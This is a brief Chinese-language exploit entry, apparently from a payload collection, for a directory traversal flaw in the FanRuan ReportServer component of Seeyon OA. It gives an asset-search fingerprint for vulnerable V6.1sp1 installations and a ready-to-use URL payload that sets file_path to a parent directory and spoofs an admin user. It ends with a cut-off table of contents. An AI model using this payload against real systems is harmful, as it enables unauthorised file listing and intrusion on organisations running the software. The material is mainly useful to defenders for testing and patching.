# 致远OA帆软组件ReportServer目录遍历漏洞

致远OA ｜ 路径遍历 ｜ —
- **指纹**：`title="致远A8-V5协同管理软件 V6.1sp1"`

**Payload**
```
/seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true
```
- **其他**：致远OA 帆软组件 ReportServer目录遍历漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* [四、漏洞复现](#%E5%9B%9B%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8